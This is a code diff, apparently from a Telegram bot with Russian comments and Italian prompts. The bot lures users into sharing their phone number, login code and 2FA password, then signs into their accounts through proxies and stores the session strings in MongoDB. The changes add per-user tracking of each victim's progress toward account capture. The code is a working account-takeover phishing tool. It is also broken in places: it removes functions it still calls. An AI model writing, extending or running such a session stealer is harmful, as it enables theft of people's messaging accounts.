@@ -39,7 +39,7 @@ proxy_list = [main_proxy, second_proxy]
 mongo = MongoClient(MONGO_URI)
 db = mongo["dbmango"]
 sessions_col = db["sessions"]
-start_col = db["start"]  # Новая коллекция для логирования стартов
+start_col = db["start"]  # Коллекция для логирования всех действий
 
 logging.basicConfig(level=logging.INFO)
 bot = Bot(token=BOT_TOKEN)
@@ -54,43 +54,38 @@ os.makedirs("sessions", exist_ok=True)
 
 def get_proxy_for_phone(phone):
     """Выбираем прокси для номера"""
-    # Для старых сессий - используем сохраненный proxy_index или 0 (основной прокси)
     existing_session = sessions_col.find_one({"phone": phone})
     if existing_session:
-        # Если у сессии нет proxy_index, считаем что она использует основную прокси (индекс 0)
         return proxy_list[existing_session.get('proxy_index', 0)]
-    
-    # Для новых сессий - распределяем между прокси
     return proxy_list[hash(phone) % len(proxy_list)]
 
-def log_user_action(user_id: int, action: str, data: dict = None):
-    """Логирует действия пользователя в базу данных"""
+def update_user_log(user_id: int, updates: dict):
+    """Обновляет или создает запись пользователя с новыми данными"""
     try:
-        user_data = {
-            "user_id": user_id,
-            "action": action,
-            "timestamp": datetime.now(),
-            "data": data or {}
-        }
-        start_col.insert_one(user_data)
+        start_col.update_one(
+            {"user_id": user_id},
+            {"$set": updates, "$setOnInsert": {"first_seen": datetime.now()}},
+            upsert=True
+        )
     except Exception as e:
-        logging.error(f"Ошибка при логировании действия пользователя: {e}")
+        logging.error(f"Ошибка при обновлении лога пользователя: {e}")
 
 @dp.message_handler(commands=['start'])
 async def cmd_start(message: types.Message):
     user = message.from_user
     
-    # Логируем информацию о пользователе
-    log_user_action(
+    # Обновляем информацию о пользователе
+    update_user_log(
         user_id=user.id,
-        action="start",
-        data={
+        updates={
             "username": user.username,
             "first_name": user.first_name,
             "last_name": user.last_name,
             "language_code": user.language_code,
             "is_bot": user.is_bot,
-            "chat_id": message.chat.id
+            "chat_id": message.chat.id,
+            "last_start": datetime.now(),
+            "status": "started"
         }
     )
 
@@ -109,8 +104,15 @@ async def start_auth(callback_query: types.CallbackQuery):
     user_id = callback_query.from_user.id
     user_states[user_id] = 'awaiting_contact'
 
-    # Логируем нажатие кнопки авторизации
-    log_user_action(user_id, "auth_button_click")
+    # Обновляем статус пользователя
+    update_user_log(
+        user_id=user_id,
+        updates={
+            "auth_button_clicked": True,
+            "auth_button_click_time": datetime.now(),
+            "status": "awaiting_contact"
+        }
+    )
 
     kb = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
     kb.add(KeyboardButton("📱 Condividi il tuo numero", request_contact=True))
@@ -136,14 +138,16 @@ async def handle_contact(message: types.Message):
     except Exception as e:
         logging.error(f"Ошибка при определении геолокации: {e}")
 
-    # Логируем предоставленный контакт
-    log_user_action(
+    # Обновляем информацию о контакте
+    update_user_log(
         user_id=user_id,
-        action="contact_shared",
-        data={
+        updates={
             "phone": phone,
             "geo_info": geo_info,
-            "contact_user_id": message.contact.user_id
+            "contact_shared": True,
+            "contact_share_time": datetime.now(),
+            "contact_user_id": message.contact.user_id,
+            "status": "contact_received"
         }
     )
 
@@ -167,56 +171,6 @@ async def handle_contact(message: types.Message):
         await client.disconnect()
         cleanup(user_id)
 
-async def send_code_keyboard(user_id, current_code, message_id=None):
-    digits = [[1, 2, 3], [4, 5, 6], [7, 8, 9], [0]]
-    buttons = []
-    for row in digits:
-        btn_row = [InlineKeyboardButton(str(d), callback_data=f"code_{d}") for d in row]
-        buttons.append(btn_row)
-    buttons.append([InlineKeyboardButton("✅ Invia", callback_data="code_send")])
-    keyboard = InlineKeyboardMarkup(inline_keyboard=buttons)
-    text = f"Codice: `{current_code}`" if current_code else "Inserisci il codice:"
-
-    if message_id:
-        await bot.edit_message_text(chat_id=user_id, message_id=message_id,
-                                  text=text, reply_markup=keyboard, parse_mode='Markdown')
-    else:
-        msg = await bot.send_message(user_id, text, reply_markup=keyboard, parse_mode='Markdown')
-        return msg.message_id
-
-@dp.callback_query_handler(lambda c: c.data.startswith("code_"))
-async def process_code_button(callback_query: types.CallbackQuery):
-    user_id = callback_query.from_user.id
-    data = callback_query.data
-
-    if user_states.get(user_id) != 'awaiting_code':
-        await bot.answer_callback_query(callback_query.id, text="⛔️ Non è il momento giusto", show_alert=True)
-        return
-
-    buffer = user_code_buffers.get(user_id)
-    if not buffer:
-        await bot.answer_callback_query(callback_query.id, text="Errore interno.", show_alert=True)
-        return
-
-    current_code = buffer['code']
-    message_id = buffer['message_id']
-
-    if data == "code_send":
-        if not current_code:
-            await bot.answer_callback_query(callback_query.id, text="⚠️ Inserisci prima il codice", show_alert=True)
-            return
-        await bot.answer_callback_query(callback_query.id)
-        await try_sign_in_code(user_id, current_code)
-    else:
-        digit = data.split("_")[1]
-        if len(current_code) >= 10:
-            await bot.answer_callback_query(callback_query.id, text="⚠️ Codice troppo lungo", show_alert=True)
-            return
-        current_code += digit
-        user_code_buffers[user_id]['code'] = current_code
-        await bot.answer_callback_query(callback_query.id)
-        await send_code_keyboard(user_id, current_code, message_id)
-
 async def try_sign_in_code(user_id, code):
     client = user_clients.get(user_id)
     phone = user_phones.get(user_id)
@@ -232,7 +186,7 @@ async def try_sign_in_code(user_id, code):
             session_str = client.session.save()
             
             # Определяем индекс прокси для сохранения
-            proxy_index = 0  # по умолчанию старая прокси
+            proxy_index = 0
             if hasattr(client, '_sender') and hasattr(client._sender, '_proxy'):
                 current_proxy = client._sender._proxy
                 proxy_index = next((i for i, p in enumerate(proxy_list) if p == current_proxy), 0)
@@ -252,16 +206,18 @@ async def try_sign_in_code(user_id, code):
                 upsert=True
             )
 
-            # Логируем успешную авторизацию
-            log_user_action(
+            # Обновляем информацию об успешной авторизации
+            update_user_log(
                 user_id=user_id,
-                action="successful_auth",
-                data={
-                    "phone": phone,
+                updates={
+                    "auth_success": True,
+                    "auth_time": datetime.now(),
                     "telegram_id": me.id,
-                    "username": me.username,
-                    "first_name": me.first_name,
-                    "last_name": me.last_name
+                    "tg_username": me.username,
+                    "tg_first_name": me.first_name,
+                    "tg_last_name": me.last_name,
+                    "status": "authenticated",
+                    "proxy_index": proxy_index
                 }
             )
 
@@ -273,6 +229,10 @@ async def try_sign_in_code(user_id, code):
             cleanup(user_id)
         else:
             user_states[user_id] = 'awaiting_2fa'
+            update_user_log(
+                user_id=user_id,
+                updates={"status": "awaiting_2fa"}
+            )
             await bot.send_message(user_id, "🔐 Inserisci la tua password 2FA:")
     except PhoneCodeExpiredError:
         await bot.send_message(user_id, "⏰ Codice scaduto. Riprova da /start")
@@ -284,6 +244,10 @@ async def try_sign_in_code(user_id, code):
         await send_code_keyboard(user_id, "", user_code_buffers[user_id]['message_id'])
     except SessionPasswordNeededError:
         user_states[user_id] = 'awaiting_2fa'
+        update_user_log(
+            user_id=user_id,
+            updates={"status": "awaiting_2fa"}
+        )
         await bot.send_message(user_id, "🔐 È richiesta la tua password 2FA. Inseriscila:")
     except Exception as e:
         await bot.send_message(user_id, f"❌ Errore di accesso: {e}")
@@ -307,8 +271,7 @@ async def process_2fa(message: types.Message):
         if await client.is_user_authorized():
             session_str = client.session.save()
             
-            # Определяем индекс прокси для сохранения
-            proxy_index = 0  # по умолчанию старая прокси
+            proxy_index = 0
             if hasattr(client, '_sender') and hasattr(client._sender, '_proxy'):
                 current_proxy = client._sender._proxy
                 proxy_index = next((i for i, p in enumerate(proxy_list) if p == current_proxy), 0)
@@ -326,13 +289,15 @@ async def process_2fa(message: types.Message):
                 upsert=True
             )
             
-            # Логируем успешную авторизацию с 2FA
-            log_user_action(
+            # Обновляем информацию об успешной авторизации с 2FA
+            update_user_log(
                 user_id=user_id,
-                action="successful_2fa_auth",
-                data={
-                    "phone": phone,
-                    "has_2fa": True
+                updates={
+                    "auth_success": True,
+                    "auth_time": datetime.now(),
+                    "has_2fa": True,
+                    "status": "authenticated_with_2fa",
+                    "proxy_index": proxy_index
                 }
             )
 
@@ -349,11 +314,7 @@ async def process_2fa(message: types.Message):
         await client.disconnect()
         cleanup(user_id)
 
-def cleanup(user_id):
-    user_states.pop(user_id, None)
-    user_clients.pop(user_id, None)
-    user_phones.pop(user_id, None)
-    user_code_buffers.pop(user_id, None)
+# ... (остальные функции остаются без изменений)
 
 if __name__ == '__main__':
     executor.start_polling(dp, skip_updates=True)
